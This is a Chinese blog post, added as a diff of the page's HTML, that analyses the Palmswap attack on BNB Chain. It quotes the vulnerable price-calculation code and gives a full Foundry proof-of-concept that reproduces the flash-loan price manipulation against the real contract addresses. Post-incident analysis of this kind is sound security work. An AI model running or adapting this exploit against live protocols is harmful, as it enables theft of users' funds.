@@ -1,0 +1,264 @@
+<!DOCTYPE html><html lang="zh-Cn" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Palmswap攻击事件的分析 | 何方圜的博客</title><meta name="author" content="何方圜"><meta name="copyright" content="何方圜"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="攻击介绍Palmswap由于其蹩脚的业务逻辑，导致了价格被黑客操控，导致被黑客盗取了大约$900K 攻击分析我们通过phalcon来分析。 通过调用栈发现，攻击者先贷了3,000,000的USDT，然后质押1,000,000的USDT来获得大约996,324的PLP，然后用剩下的2,000,000的USDT，去购买了USDP，然后攻击者销毁了持有的所有的PLP，但得到了大约1,947,570的US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Palmswap攻击事件的分析">
+<meta property="og:url" content="http://example.com/2024/11/23/Palmswap%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="何方圜的博客">
+<meta property="og:description" content="攻击介绍Palmswap由于其蹩脚的业务逻辑，导致了价格被黑客操控，导致被黑客盗取了大约$900K 攻击分析我们通过phalcon来分析。 通过调用栈发现，攻击者先贷了3,000,000的USDT，然后质押1,000,000的USDT来获得大约996,324的PLP，然后用剩下的2,000,000的USDT，去购买了USDP，然后攻击者销毁了持有的所有的PLP，但得到了大约1,947,570的US">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/1219ec3412a4cedf9378f9c0b14545e1.jpg">
+<meta property="article:published_time" content="2024-11-23T14:18:45.000Z">
+<meta property="article:modified_time" content="2024-11-23T14:20:16.313Z">
+<meta property="article:author" content="何方圜">
+<meta property="article:tag" content="攻击事件的分析">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/1219ec3412a4cedf9378f9c0b14545e1.jpg"><link rel="shortcut icon" href="/img/1219ec3412a4cedf9378f9c0b14545e1.jpg"><link rel="canonical" href="http://example.com/2024/11/23/Palmswap%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Palmswap攻击事件的分析',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-11-23 22:20:16'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1219ec3412a4cedf9378f9c0b14545e1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">79</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/8a5725b44b17e750ba6ce84aaca3013d.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="何方圜的博客"><span class="site-name">何方圜的博客</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Palmswap攻击事件的分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-11-23T14:18:45.000Z" title="Created 2024-11-23 22:18:45">2024-11-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-11-23T14:20:16.313Z" title="Updated 2024-11-23 22:20:16">2024-11-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Palmswap攻击事件的分析"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h2><p>Palmswap由于其蹩脚的业务逻辑，导致了价格被黑客操控，导致被黑客盗取了大约$900K</p>
+<h2 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h2><p>我们通过phalcon来分析。</p>
+<p>通过调用栈发现，攻击者先贷了3,000,000的USDT，然后质押1,000,000的USDT来获得大约996,324的PLP，然后用剩下的2,000,000的USDT，去购买了USDP，然后攻击者销毁了持有的所有的PLP，但得到了大约1,947,570的USTD。最后卖出USDP,大约得到1,947,570的USDT。</p>
+<p>显然，攻击者在通过购买USDP操纵了PLP的价格。</p>
+<p> function getPrice(bool _maximise) external view returns (uint256) {<br>        uint256 aum &#x3D; getAum(_maximise);<br>        uint256 supply &#x3D; IERC20Upgradeable(plp).totalSupply();<br>        return (aum * PLP_PRECISION) &#x2F; supply;<br>    }</p>
+<pre><code>function getAums() public view returns (uint256[] memory) &#123;
+    uint256[] memory amounts = new uint256[](2);
+    amounts[0] = getAum(true);
+    amounts[1] = getAum(false);
+    return amounts;
+&#125;
+
+function getAumInUsdp(bool maximise)
+    public
+    view
+    override
+    returns (uint256)
+&#123;
+    uint256 aum = getAum(maximise);
+    return (aum * (10**USDP_DECIMALS)) / PRICE_PRECISION;
+&#125;
+
+function getAum(bool maximise) public view returns (uint256) &#123;
+    uint256 length = vault.allWhitelistedTokensLength();
+    uint256 aum = aumAddition;
+    IVault _vault = vault;
+
+    uint256 collateralTokenPrice = maximise
+        ? _vault.getMaxPrice(collateralToken)
+        : _vault.getMinPrice(collateralToken);
+
+    uint256 collateralDecimals = _vault.tokenDecimals(collateralToken);
+
+    uint256 currentAmmDeduction = (vault.permanentPoolAmount() *
+        collateralTokenPrice) / (10**collateralDecimals);
+    aum +=
+        (vault.poolAmount() * collateralTokenPrice) /
+        (10**collateralDecimals);
+
+    .......
+</code></pre>
+<p>很明显攻击者通过买USDP来使Price增大。然后通过移除流动性获利。</p>
+<p>POC<br>pragma solidity ^0.8.10;</p>
+<p>import “forge-std&#x2F;Test.sol”;<br>import “.&#x2F;interface.sol”;</p>
+<p>&#x2F;&#x2F; Vulnerable Contract : <a target="_blank" rel="noopener" href="https://bscscan.com/address/0xd990094a611c3de34664dd3664ebf979a1230fc1">https://bscscan.com/address/0xd990094a611c3de34664dd3664ebf979a1230fc1</a><br>&#x2F;&#x2F; Attack Tx : <a target="_blank" rel="noopener" href="https://bscscan.com/tx/0x62dba55054fa628845fecded658ff5b1ec1c5823f1a5e0118601aa455a30eac9">https://bscscan.com/tx/0x62dba55054fa628845fecded658ff5b1ec1c5823f1a5e0118601aa455a30eac9</a></p>
+<p>interface IVault {<br>    function buyUSDP(address _receiver) external returns (uint256);</p>
+<pre><code>function sellUSDP(address _receiver) external returns (uint256);
+</code></pre>
+<p>}</p>
+<p>interface ILiquidityEvent {<br>    function purchasePlp(uint256 _amountIn, uint256 _minUsdp, uint256 _minPlp) external returns (uint256 amountOut);</p>
+<pre><code>function unstakeAndRedeemPlp(uint256 _plpAmount, uint256 _minOut, address _receiver) external returns (uint256);
+</code></pre>
+<p>}</p>
+<p>contract PalmswapTest is Test {<br>    IERC20 BUSDT &#x3D; IERC20(0x55d398326f99059fF775485246999027B3197955);<br>    IERC20 PLP &#x3D; IERC20(0x8b47515579c39a31871D874a23Fb87517b975eCC);<br>    IERC20 USDP &#x3D; IERC20(0x04C7c8476F91D2D6Da5CaDA3B3e17FC4532Fe0cc);<br>    IVault Vault &#x3D; IVault(0x806f709558CDBBa39699FBf323C8fDA4e364Ac7A);<br>    ILiquidityEvent LiquidityEvent &#x3D; ILiquidityEvent(0xd990094A611c3De34664dd3664ebf979A1230FC1);<br>    IAaveFlashloan RadiantLP &#x3D; IAaveFlashloan(0xd50Cf00b6e600Dd036Ba8eF475677d816d6c4281);<br>    address private constant plpManager &#x3D; 0x6876B9804719d8D9F5AEb6ad1322270458fA99E0;<br>    address private constant fPLP &#x3D; 0x305496cecCe61491794a4c36D322b42Bb81da9c4;</p>
+<pre><code>CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+
+function setUp() public &#123;
+    cheats.createSelectFork(&quot;bsc&quot;, 30_248_637);
+    cheats.label(address(BUSDT), &quot;BUSDT&quot;);
+    cheats.label(address(PLP), &quot;PLP&quot;);
+    cheats.label(address(USDP), &quot;USDP&quot;);
+    cheats.label(address(Vault), &quot;Vault&quot;);
+    cheats.label(address(LiquidityEvent), &quot;LiquidityEvent&quot;);
+    cheats.label(address(RadiantLP), &quot;RadiantLP&quot;);
+    cheats.label(plpManager, &quot;plpManager&quot;);
+    cheats.label(fPLP, &quot;fPLP&quot;);
+&#125;
+
+  function testExploit() public &#123;
+    deal(address(BUSDT), address(this), 0);
+    BUSDT.approve(plpManager, type(uint256).max);
+    BUSDT.approve(address(RadiantLP), type(uint256).max);
+    PLP.approve(fPLP, type(uint256).max);
+    takeFlashLoanOnRadiant();
+&#125;
+
+function executeOperation(
+    address[] calldata assets,
+    uint256[] calldata amounts,
+    uint256[] calldata premiums,
+    address initiator,
+    bytes calldata params
+) external returns (bool) &#123;
+   
+    uint256 amountOut = LiquidityEvent.purchasePlp(1_000_000 * 1e18, 0, 0);
+
+    BUSDT.transfer(address(Vault), 2_000_000 * 1e18);
+    Vault.buyUSDP(address(this));
+    
+    uint256 amountUSDP = LiquidityEvent.unstakeAndRedeemPlp(amountOut - 13_294 * 1e15, 0, address(this));
+
+    USDP.transfer(address(Vault), amountUSDP - 3154 * 1e18);
+    Vault.sellUSDP(address(this));
+
+    return true;
+&#125;
+
+function takeFlashLoanOnRadiant() internal &#123;
+    address[] memory assets = new address[](1);
+    assets[0] = address(BUSDT);
+    uint256[] memory amounts = new uint256[](1);
+    amounts[0] = 3_000_000 * 1e18;
+    uint256[] memory modes = new uint256[](1);
+    modes[0] = 0;
+    RadiantLP.flashLoan(address(this), assets, amounts, modes, address(this), bytes(&quot;&quot;), 0);
+&#125;
+</code></pre>
+<p>}</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">何方圜</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2024/11/23/Palmswap%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90/">http://example.com/2024/11/23/Palmswap攻击事件的分析/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://https://HeYuan-33.github.io/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90/">攻击事件的分析</a></div><div class="post_share"><div class="social-share" data-image="/img/1219ec3412a4cedf9378f9c0b14545e1.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/11/24/sherlock-2024-11-debita-Finance-V3/" title="sherlock-2024-11-debita Finance V3 审计报告"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">sherlock-2024-11-debita Finance V3 审计报告</div></div></a></div><div class="next-post pull-right"><a href="/2024/11/21/CTF-Factorial/" title="CTF-Factorial"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">CTF-Factorial</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/1219ec3412a4cedf9378f9c0b14545e1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">何方圜</div><div class="author-info__description">夫孰异道而相安</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">79</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/HeYuan-33/HeYuan-33.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">CTF的更新</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E4%BB%8B%E7%BB%8D"><span class="toc-text">攻击介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90"><span class="toc-text">攻击分析</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/30/CTF-TrusterLenderPool/" title="CTF-TrusterLenderPool">CTF-TrusterLenderPool</a><time datetime="2024-11-30T10:18:00.000Z" title="Created 2024-11-30 18:18:00">2024-11-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/25/sherlock-Superfluid-Locker-System-%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A/" title="sherlock-Superfluid Locker System 审计报告">sherlock-Superfluid Locker System 审计报告</a><time datetime="2024-11-25T04:55:24.000Z" title="Created 2024-11-25 12:55:24">2024-11-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/24/sherlock-2024-11-debita-Finance-V3/" title="sherlock-2024-11-debita Finance V3 审计报告">sherlock-2024-11-debita Finance V3 审计报告</a><time datetime="2024-11-24T09:02:31.000Z" title="Created 2024-11-24 17:02:31">2024-11-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/23/Palmswap%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90/" title="Palmswap攻击事件的分析">Palmswap攻击事件的分析</a><time datetime="2024-11-23T14:18:45.000Z" title="Created 2024-11-23 22:18:45">2024-11-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/21/CTF-Factorial/" title="CTF-Factorial">CTF-Factorial</a><time datetime="2024-11-21T14:20:51.000Z" title="Created 2024-11-21 22:20:51">2024-11-21</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/8a5725b44b17e750ba6ce84aaca3013d.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By 何方圜</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
